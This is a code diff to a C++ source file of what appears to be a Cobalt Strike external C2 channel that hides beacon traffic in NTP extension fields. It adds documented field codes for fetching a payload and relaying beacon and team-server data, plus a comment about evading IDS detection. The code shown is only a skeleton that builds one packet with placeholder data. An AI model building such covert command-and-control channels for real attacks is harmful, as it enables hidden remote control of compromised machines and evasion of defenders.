@@ -3,11 +3,22 @@
 CS-EXTC2-NTP
 
 
+Extension Field Key:
+
+0x4d, 0x5a: Give me a payload. When the server sees this, a payload will be sent back
+	> This should likely change. 0x4d, 0x5a has a great chance at getting picked up as a "binary" by IDS tools
+
+0xAA,0xBB: Getting team server data from server to go to beacon
+0xBB,0xAA: Sending beacon data back to server
+
 
 */
 
+
+
 #include <iostream>
 #include "ntp.hpp"
+#include "constants.hpp"
 
 int main() {
 	//Stuff here
@@ -17,10 +28,11 @@ int main() {
 	auto packet = NTPPacket();
 	//packet.printPacket();
 
-	std::array<uint8_t, 2> fieldArray = {0x4d,0x5a}; //pretend to be abinary cuz why not
+	//std::array<uint8_t, 2> fieldArray = {0x4d,0x5a}; //pretend to be abinary cuz why not
 	std::vector<uint8_t> packetData = {10,20,30,40};
 	packet.addExtensionField(
-		fieldArray,
+		//fieldArray,
+		NtpExtensionHeader::giveMePayload,
 		packetData
 	);
 
